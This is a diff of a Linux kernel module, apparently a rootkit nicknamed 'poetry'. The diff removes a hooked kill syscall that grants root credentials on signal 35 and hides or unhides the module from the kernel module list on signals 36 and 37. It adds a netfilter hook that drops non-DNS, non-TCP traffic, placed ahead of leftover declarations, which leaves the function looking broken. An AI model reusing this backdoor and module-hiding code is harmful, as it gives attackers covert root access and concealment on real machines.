@@ -1,16 +1,28 @@
-#include "ftrace_hook.h"
-
-static struct list_head *prev_module;
-static short hidden = 0;
-
-////////////////////////////////
-//TODO FIX ALL {} formatting
-////////////////////////////////
-
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
               const struct nf_hook_state *state)
 {
+    struct iphdr *iph;
+	struct udphdr *udph;
+	if (!skb)
+		return NF_ACCEPT;
+
+	iph = ip_hdr(skb);
+	if (iph->protocol == IPPROTO_UDP) {
+		udph = udp_hdr(skb);
+		if (ntohs(udph->dest) == 53) {
+			return NF_ACCEPT;
+		}
+	}
+	else if (iph->protocol == IPPROTO_TCP) {
+		return NF_ACCEPT;
+	}
+	
+	return NF_DROP;
+
+
+
+
       //Network headers
     struct iphdr *ip_header;        //ip header
     struct tcphdr *tcp_header;      //tcp header
@@ -106,68 +118,3 @@ struct nf_hook_ops my_nfho = {
       .pf          = PF_INET,
       .priority    = NF_IP_PRI_FIRST
 };
-
-
-void set_root(void)
-{
-    struct cred *root;
-    root = prepare_creds();
-
-    if (root == NULL)
-        return;
-
-    root->uid.val = root->gid.val = 0;
-    root->euid.val = root->egid.val = 0;
-    root->suid.val = root->sgid.val = 0;
-    root->fsuid.val = root->fsgid.val = 0;
-
-    commit_creds(root);
-}
-
-
-void showme(void)
-{
-    /* Add the saved list_head struct back to the module list */
-    list_add(&THIS_MODULE->list, prev_module);
-    hidden = 0;
-}
-
-void hideme(void)
-{
-    /* Save the module in the list before us, so we can add ourselves
-     * back to the list in the same place later. */
-    prev_module = THIS_MODULE->list.prev;
-    /* Remove ourselves from the list module list */
-    list_del(&THIS_MODULE->list);
-    hidden = 1;
-}
-
-
-static asmlinkage long (*orig_kill)(const struct pt_regs *);
-asmlinkage int hook_kill(const struct pt_regs *regs)
-{
-
-    int sig = regs->si;
-
-    if ( sig == 35 )
-    {
-        printk(KERN_INFO "poetry: giving root\n");
-        set_root();
-        return 0;
-    } 
-    else if ( sig == 36 ) 
-    {
-        printk(KERN_INFO "poetry: hiding\n");
-        hideme();
-        return 0;
-    }
-    else if ( sig == 37 ) 
-    {
-        printk(KERN_INFO "poetry: unhiding\n");
-        showme();
-        return 0;
-    }
-
-    return orig_kill(regs);
-
-}
